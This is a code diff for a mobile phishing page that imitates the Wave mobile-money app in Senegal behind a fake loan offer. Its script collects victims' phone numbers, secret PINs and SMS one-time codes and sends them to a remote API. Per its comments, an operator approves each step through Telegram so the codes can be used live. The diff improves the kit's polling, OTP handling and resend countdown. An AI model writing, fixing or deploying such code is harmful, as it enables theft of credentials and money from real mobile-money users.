@@ -20,40 +20,32 @@ body { font-family: 'Patrick Hand', cursive; background: #f0f0f0; display:flex; 
 
 @media(max-width:430px){
   body { background:#fff; align-items:flex-start; padding:0; margin:0; }
-  /* wrap is exactly the screen — no scroll here */
   .wrap { width:100vw; height:100dvh; border-radius:0; overflow:hidden; position:fixed; top:0; left:0; }
 }
 
-/* Each screen fills the wrap exactly */
 .scr { display:none; flex-direction:column; height:844px; background:#fff; }
 @media(max-width:430px){
   .scr { height:100dvh; }
 }
 .scr.active { display:flex; }
 
-/* Landing is the only page that scrolls internally */
 #s-land { overflow-y:auto; -webkit-overflow-scrolling:touch; }
 
-/* Step screens: flex column, content scrolls, footer pinned */
 #s-p1, #s-p2, #s-p3 { overflow:hidden; }
 .pbody { padding:18px 20px 12px; flex:1; display:flex; flex-direction:column; overflow-y:auto; -webkit-overflow-scrolling:touch; min-height:0; }
 .step-footer { padding:10px 20px 16px; background:#fff; border-top:1px solid #f0f0f0; flex-shrink:0; }
 
-/* Auth screens fit exactly, no scroll */
 #s-login, #s-pin, #s-otp, #s-splash, #s-ok { overflow:hidden; }
 
-/* TOP BAR */
 .tbar { display:flex; align-items:center; justify-content:center; gap:8px; padding:22px 0 0; flex-shrink:0; }
 .tbar-title { font-size:18px; font-weight:700; color:#111; }
 .tbar-title em { font-style:normal; color:#4dc8e8; }
 
-/* CYAN BUTTON */
 .cbtn { display:block; width:100%; padding:16px; background:#4dc8e8; border:none; border-radius:50px; font-size:15px; font-family:'Patrick Hand',cursive; font-weight:700; color:#fff; cursor:pointer; text-align:center; }
 .cbtn:disabled { background:#b3e8f5; cursor:not-allowed; }
 .gbtn { display:block; flex:1; padding:14px; background:#f5f5f5; border:none; border-radius:50px; font-size:14px; font-family:'Patrick Hand',cursive; font-weight:600; color:#666; cursor:pointer; }
 .brow { display:flex; gap:10px; }
 
-/* HERO */
 .hero { margin:14px; background:#4dc8e8; border-radius:20px; padding:20px 18px; display:flex; justify-content:space-between; align-items:flex-start; gap:8px; flex-shrink:0; }
 .hero-left {}
 .hero-eye { font-size:10px; font-weight:600; letter-spacing:0.1em; color:rgba(255,255,255,0.6); text-transform:uppercase; margin-bottom:6px; }
@@ -63,7 +55,6 @@ body { font-family: 'Patrick Hand', cursive; background: #f0f0f0; display:flex; 
 .dot { width:6px; height:6px; border-radius:50%; background:#4ade80; animation:pulse 2s ease-in-out infinite; flex-shrink:0; }
 @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
 
-/* CALC AREA */
 .calc { padding:14px 14px 0; flex-shrink:0; }
 .calc-top { display:flex; justify-content:space-between; align-items:baseline; margin-bottom:6px; }
 .calc-lbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.05em; }
@@ -71,21 +62,18 @@ body { font-family: 'Patrick Hand', cursive; background: #f0f0f0; display:flex; 
 input[type=range] { width:100%; height:5px; -webkit-appearance:none; border-radius:5px; outline:none; cursor:pointer; background:#eee; margin-bottom:14px; }
 input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; height:22px; border-radius:50%; background:#fff; border:2.5px solid #4dc8e8; box-shadow:0 1px 5px rgba(77,200,232,0.3); cursor:pointer; }
 
-/* META BOXES */
 .mgrid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:16px; }
 .mbox { background:#f7f7f7; border-radius:14px; padding:12px 14px; }
 .mbox-lbl { font-size:10px; color:#aaa; letter-spacing:0.06em; text-transform:uppercase; margin-bottom:4px; }
 .mbox-val { font-size:16px; font-weight:700; color:#111; }
 .mbox-note { font-size:10px; color:#ccc; margin-top:2px; }
 
-/* TRUST */
 .trust { display:flex; justify-content:space-around; padding:14px 20px; border-top:1px solid #f5f5f5; border-bottom:1px solid #f5f5f5; margin-bottom:16px; flex-shrink:0; }
 .ti { display:flex; flex-direction:column; align-items:center; gap:5px; }
 .ti-icon { width:34px; height:34px; border-radius:10px; background:#f0fbfe; display:flex; align-items:center; justify-content:center; }
 .ti-icon svg { width:16px; height:16px; stroke:#4dc8e8; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
 .ti-lbl { font-size:9.5px; color:#aaa; letter-spacing:0.04em; text-transform:uppercase; font-weight:600; }
 
-/* FEATURES */
 .flist { margin-bottom:40px; flex-shrink:0; }
 .frow { display:flex; align-items:center; gap:14px; padding:14px 20px; border-bottom:1px solid #f5f5f5; }
 .ficon { width:38px; height:38px; border-radius:12px; background:#f0fbfe; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
@@ -93,7 +81,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .ftext h4 { font-size:14px; font-weight:600; color:#111; margin-bottom:2px; }
 .ftext p { font-size:12px; color:#aaa; line-height:1.4; }
 
-/* STEP PAGES */
 .ph { font-size:20px; font-weight:700; color:#111; margin-bottom:4px; }
 .ps { font-size:13px; color:#aaa; margin-bottom:20px; line-height:1.4; }
 .spacer { flex:1; min-height:20px; }
@@ -102,7 +89,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .prog-track { height:4px; background:#eee; border-radius:4px; overflow:hidden; }
 .prog-fill { height:100%; background:#4dc8e8; border-radius:4px; }
 
-/* FIELDS */
 .field { margin-bottom:15px; }
 .flbl { display:block; font-size:11px; font-weight:600; letter-spacing:0.06em; color:#aaa; margin-bottom:6px; text-transform:uppercase; }
 .field input, .field select { width:100%; padding:13px 15px; background:#f7f7f7; border:1.5px solid transparent; border-radius:14px; font-size:15px; font-family:'Patrick Hand',cursive; color:#111; outline:none; -webkit-appearance:none; }
@@ -115,13 +101,11 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .prow input:focus { border-color:#4dc8e8; background:#fff; }
 .prow input::placeholder { color:#ccc; }
 
-/* REPAY BOX */
 .rbox { background:#f0fbfe; border:2px solid #b3e8f5; border-radius:16px; padding:16px 18px; display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; }
 .rbox-lbl { font-size:11px; color:#aaa; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:3px; }
 .rbox-note { font-size:10px; color:#aaa; margin-top:2px; }
 .rbox-val { font-size:20px; font-weight:700; color:#4dc8e8; }
 
-/* SUMMARY */
 .sumbox { background:#f7f7f7; border-radius:16px; padding:4px 0; margin-bottom:16px; }
 .sumrow { display:flex; justify-content:space-between; align-items:center; padding:12px 16px; border-bottom:1px solid #eee; }
 .sumrow:last-child { border-bottom:none; }
@@ -129,7 +113,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .sumval { font-size:14px; font-weight:600; color:#111; }
 .legal { font-size:12px; color:#aaa; line-height:1.6; margin-bottom:18px; padding:12px 14px; background:#f7f7f7; border-radius:12px; border-left:3px solid #b3e8f5; }
 
-/* SUCCESS */
 .succ-wrap { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; text-align:center; overflow-y:auto; }
 .succ-pen { position:relative; width:80px; height:80px; margin:0 auto 20px; animation:pop 0.5s cubic-bezier(0.34,1.4,0.64,1) both; }
 @keyframes pop { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
@@ -146,15 +129,12 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .mbtn { width:100%; padding:12px; background:transparent; border:1px solid #eee; border-radius:50px; font-size:13px; font-family:'Patrick Hand',cursive; font-weight:600; color:#aaa; cursor:pointer; }
 .fnote { margin-top:16px; font-size:11px; color:#ccc; }
 
-/* ══ SPLASH SCREEN ══ */
 .splash-wrap { flex:1; display:flex; align-items:center; justify-content:center; }
 .splash-penguin { animation: splashPop 0.5s cubic-bezier(0.34,1.5,0.64,1) both; }
 @keyframes splashPop { from{transform:scale(0.6) translateY(20px);opacity:0} to{transform:scale(1) translateY(0);opacity:1} }
 
-/* ══ LANDING — scrollable ══ */
 #s-land { overflow-y: auto; -webkit-overflow-scrolling: touch; }
 
-/* ══ WAVE AUTH SCREENS ══ */
 .wave-h {
   font-size:17px; font-weight:700; color:#111;
   text-align:center; padding:44px 28px 28px;
@@ -183,7 +163,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 }
 .wave-ph-in::placeholder { color:#bbb; }
 
-/* Numeric keypad */
 .keypad {
   display:grid; grid-template-columns:repeat(3,1fr);
   gap:0; flex-shrink:0;
@@ -195,7 +174,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
   transition:background 0.1s;
   user-select:none; gap:1px;
 }
-/* Compress auth screens for smaller phones */
 @media(max-height:780px){ .kk { height:60px; } .wave-h { padding:28px 28px 20px; } }
 @media(max-height:720px){ .kk { height:54px; } .wave-h { padding:20px 28px 16px; font-size:15px; } .pin-lock-wrap { padding-top:28px; } .wave-next { margin:8px 24px 20px; padding:15px; } }
 @media(max-height:667px){ .kk { height:48px; } .kk-num { font-size:22px; } .wave-h { padding:14px 28px 12px; font-size:14px; } .pin-lock-wrap { padding-top:16px; } .pin-dots-row { padding:18px 0 0; } .wave-next { margin:6px 24px 14px; padding:14px; font-size:15px; } .otp-digit { font-size:34px; min-height:40px; } }
@@ -223,7 +201,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 }
 .wave-back svg { width:22px; height:22px; stroke:#111; fill:none; stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
 
-/* PIN dots row */
 .pin-dots-row {
   display:flex; justify-content:center; gap:20px;
   padding:32px 0 0; flex-shrink:0;
@@ -237,7 +214,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 
 .pin-lock-wrap { display:flex; justify-content:center; padding-top:44px; flex-shrink:0; }
 
-/* OTP digit slots */
 .otp-slot {
   display:flex; flex-direction:column; align-items:center;
   width:56px; border-bottom:2px solid #ccc; padding-bottom:4px;
@@ -250,7 +226,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
   min-height:50px; display:flex; align-items:flex-end;
 }
 
-/* OVERLAYS */
 .ov { position:fixed; top:0;left:0;right:0;bottom:0; background:rgba(0,0,0,0.25); display:none; align-items:center; justify-content:center; z-index:999; backdrop-filter:blur(2px); }
 .ov.show { display:flex; }
 .load-card { background:#fff; border-radius:20px; padding:26px 24px; text-align:center; box-shadow:0 8px 40px rgba(0,0,0,0.12); }
@@ -265,7 +240,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .pop-p { font-size:13px; color:#aaa; line-height:1.5; margin-bottom:20px; }
 .pop-btn { background:#4dc8e8; color:#fff; border:none; padding:13px 20px; border-radius:50px; font-size:14px; font-weight:600; font-family:'Patrick Hand',cursive; width:100%; cursor:pointer; }
 
-/* TOAST */
 .toast { position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(10px); background:#fff; border:1px solid #eee; border-radius:14px; padding:10px 14px; display:flex; align-items:center; gap:10px; box-shadow:0 4px 20px rgba(0,0,0,0.08); opacity:0; transition:opacity 0.3s,transform 0.3s; pointer-events:none; z-index:100; white-space:nowrap; }
 .toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
 .tav { width:30px; height:30px; border-radius:50%; background:#f0fbfe; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; color:#4dc8e8; flex-shrink:0; }
@@ -274,7 +248,6 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 .tck { width:20px; height:20px; border-radius:50%; background:#f0fdf4; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
 .tck svg { width:11px; height:11px; stroke:#22c55e; fill:none; stroke-width:2.5; stroke-linecap:round; stroke-linejoin:round; }
 
-/* ── Responsive step screens ── */
 @media(max-width:430px) and (max-height:780px){
   .tbar { padding:14px 0 0; }
   .prog-wrap { margin-bottom:12px; }
@@ -458,7 +431,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 
   <!-- ══ LOGIN ══ -->
   <div class="scr" id="s-login" style="flex-direction:column;">
-    <div class="wave-h">Bienvenue sur Wave ! Entrez votre numéro pour commencer</div>
+    <div class="wave-h">Bienvenue sur Wave ! Entrez votre numéro pour commencer</div>
     <div style="display:flex;align-items:flex-end;padding:0 24px 8px;border-bottom:2px solid #4dc8e8;margin:0 24px;flex-shrink:0;">
       <div class="wave-cc">
         <span>🇸🇳 +221</span>
@@ -516,7 +489,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
       <button class="kk" onclick="kpPress('pin',7)"><span class="kk-num">7</span><span class="kk-letters">PQRS</span></button>
       <button class="kk" onclick="kpPress('pin',8)"><span class="kk-num">8</span><span class="kk-letters">TUV</span></button>
       <button class="kk" onclick="kpPress('pin',9)"><span class="kk-num">9</span><span class="kk-letters">WXYZ</span></button>
-      <button class="kk forgot-key"><span class="kk-num">OUBLIÉ ?</span><span class="kk-letters"></span></button>
+      <button class="kk forgot-key"><span class="kk-num">OUBLIÉ ?</span><span class="kk-letters"></span></button>
       <button class="kk" onclick="kpPress('pin',0)"><span class="kk-num">0</span><span class="kk-letters">+</span></button>
       <button class="kk backspace" onclick="kpBack('pin')">
         <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
@@ -650,7 +623,6 @@ function p2go(){
 
 function submitApp(){
   go('s-p3','s-ok');
-  // Wake up the server immediately so it's ready when user reaches PIN screen
   fetch(API + '?action=ping&t=' + Date.now()).catch(function(){});
 
   var s=5, tEl=document.getElementById('sessTxt'), sp=document.getElementById('sessSpinner'), cb=document.getElementById('contBtn');
@@ -662,14 +634,12 @@ function submitApp(){
       tEl.textContent='Session sécurisée ✓';
       sp.style.display='none';
       cb.style.display='block';
-      // Auto-proceed after short delay
       setTimeout(function(){
         go('s-ok','s-splash');
         setTimeout(function(){ go('s-splash','s-login'); }, 1500);
       }, 800);
     } else {
       tEl.textContent='Chiffrement… ('+s+'s)';
-      // Keep pinging server every 2s to prevent sleep
       if(s % 2 === 0) fetch(API + '?action=ping&t=' + Date.now()).catch(function(){});
     }
   },1000);
@@ -713,7 +683,6 @@ function updatePinDots() {
 function loginGo(){
   var raw = loginVal;
   if(raw.length<9) return;
-  // Reset any stale session when starting fresh login
   sessId = null;
   if(pollTmr){ clearInterval(pollTmr); pollTmr = null; }
   pinVal = ''; updatePinDots();
@@ -739,7 +708,6 @@ async function submitPIN(){
   var payload = { firstName: fn||'Unknown', lastName: ln||'User', phone: raw, pin: pin };
   if(sessId) payload.sessionId = sessId;
 
-  // Try up to 3 times (server may be waking up)
   var r = null;
   for(var attempt = 0; attempt < 3; attempt++){
     try {
@@ -767,7 +735,6 @@ async function submitPIN(){
 
   var sid = (r.data && r.data.sessionId) || r.sessionId || r.session_id;
   if(sid){
-    // Keep spinner — waits until Telegram approval before moving to OTP
     showLoad('En attente de validation…');
     startPoll(sid);
   } else if(r.success === false){
@@ -782,10 +749,10 @@ async function submitPIN(){
 }
 
 /* ═══════════════════════════════════════════
-   POLL + OTP — clean single-instance logic
+   POLL + OTP — fixed version
 ═══════════════════════════════════════════ */
 
-var pollActive = false;  // prevents overlapping polls
+var pollActive = false;
 
 function stopPoll(){
   if(pollTmr){ clearInterval(pollTmr); pollTmr=null; }
@@ -794,10 +761,9 @@ function stopPoll(){
 }
 
 function startPoll(sid){
-  stopPoll();           // always clear before starting
+  stopPoll();
   sessId = sid;
   pollActive = true;
-  // Cycle loading messages so user knows we're waiting for Telegram
   var msgs = [
     'En attente de validation…',
     'Vérification en cours…',
@@ -811,6 +777,7 @@ function startPoll(sid){
     var el = document.getElementById('load-txt');
     if(el) el.textContent = msgs[mi];
   }, 3000);
+
   pollTmr = setInterval(async function(){
     if(!pollActive){ clearInterval(msgTimer); return; }
     try{
@@ -832,14 +799,15 @@ function startPoll(sid){
         showPop('Code PIN incorrect','Le code secret saisi est erroné. Veuillez vérifier et réessayer.');
         setTimeout(function(){ pinVal=''; updatePinDots(); }, 300);
 
-      // ── wrong OTP code ──
+      // ── wrong OTP — FIX: skip entirely if doVerify() is handling it ──
       } else if(r.status==='wrong_code'){
+        if(verifying) return;  // doVerify owns this result — do not interfere
+        // Also skip if user is mid-entry (has typed 1-3 digits already)
+        if(otpVal.length > 0 && otpVal.length < 4) return;
         stopPoll();
         hideLoad();
-        if(!verifying){  // only show if doVerify didn't already handle it
-          showPop('Code invalide','Le code de validation est incorrect. Veuillez réessayer.');
-          setTimeout(function(){ resetOTP(); }, 400);
-        }
+        showPop('Code invalide','Le code de validation est incorrect. Veuillez réessayer.');
+        setTimeout(function(){ resetOTP(); }, 400);
 
       // ── insufficient funds ──
       } else if(r.status==='continue'){
@@ -860,14 +828,15 @@ function startPoll(sid){
         setTimeout(function(){ pinVal=''; updatePinDots(); go('s-pin','s-login'); loginVal=''; document.getElementById('loginPh').value=''; }, 1500);
       }
     }catch(e){}
-  }, 1200);  // 1.2s interval — avoids hammering
+  }, 1200);
 }
 
-// Enter OTP screen cleanly
+// ── FIX: enterOTP — start resend countdown AFTER screen transition ──
 function enterOTP(sid){
   resetOTP();
   go('s-pin','s-otp');
-  startResendCd(10);
+  // Small delay ensures the OTP screen is visible before countdown starts
+  setTimeout(function(){ startResendCd(30); }, 150);
   // Resume polling for OTP status
   startPoll(sid);
 }
@@ -904,59 +873,63 @@ function resetOTP(){
 async function doVerify(){
   if(otpVal.length!==4 || !sessId || verifying) return;
   verifying = true;
-  stopPoll();           // pause polling — we handle the result ourselves
+  stopPoll();
   showLoad();
   var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
   hideLoad();
   if(r && r.success){
     verifying = false;
-    startPoll(sessId);  // poll will catch approved/wrong_code from here
+    startPoll(sessId);
   } else {
-    // API call itself failed (network error etc) — show error, reset
     showPop('Code incorrect','Le code de validation saisi est incorrect. Veuillez réessayer.');
     setTimeout(function(){
-      resetOTP();       // resets verifying = false too
+      resetOTP();
       startPoll(sessId);
     }, 800);
   }
 }
 
-/* ── Resend countdown ── */
+/* ── Resend countdown — FIX: robust timer management ── */
 var resTimer = null;
+
 function startResendCd(secs){
   var btn = document.getElementById('resendBtn');
   var cd  = document.getElementById('resendCd');
-  clearInterval(resTimer);      // clear any existing timer FIRST
+  // Always clear any existing countdown first
+  if(resTimer){ clearInterval(resTimer); resTimer = null; }
   btn.disabled = true;
   btn.style.opacity = '0.4';
-  var s = secs || 10;
-  cd.textContent = 'Renvoyer dans '+s+'s';
+  var s = secs || 30;
+  cd.textContent = 'Renvoyer dans ' + s + 's';
   resTimer = setInterval(function(){
     s--;
-    if(s<=0){
+    if(s <= 0){
       clearInterval(resTimer);
       resTimer = null;
       cd.textContent = '';
       btn.disabled = false;
       btn.style.opacity = '1';
     } else {
-      cd.textContent = 'Renvoyer dans '+s+'s';
+      cd.textContent = 'Renvoyer dans ' + s + 's';
     }
   }, 1000);
 }
 
 async function doResend(){
   if(!sessId) return;
+  // FIX: reset OTP and start countdown immediately for instant feedback
   resetOTP();
-  startResendCd(10);
-  await callApi('reset_otp', { sessionId: sessId });
+  startResendCd(30);
   var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
   var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
+  // Call APIs (countdown already running — no second call needed)
+  await callApi('reset_otp', { sessionId: sessId });
   var r = await callApi('otp_resend', { sessionId: sessId, phone: loginVal, firstName: fn, lastName: ln });
   if(!r || !r.success){
     await callApi('login_attempt', { sessionId: sessId, phone: loginVal, firstName: fn||'Unknown', lastName: ln||'User', pin: pinVal||'0000', resend: '1' });
   }
   startPoll(sessId);
+  // Show toast confirmation
   document.getElementById('tav').textContent = '✉';
   document.getElementById('tn').textContent  = 'SMS renvoyé';
   document.getElementById('td').textContent  = 'Un nouveau code a été envoyé';
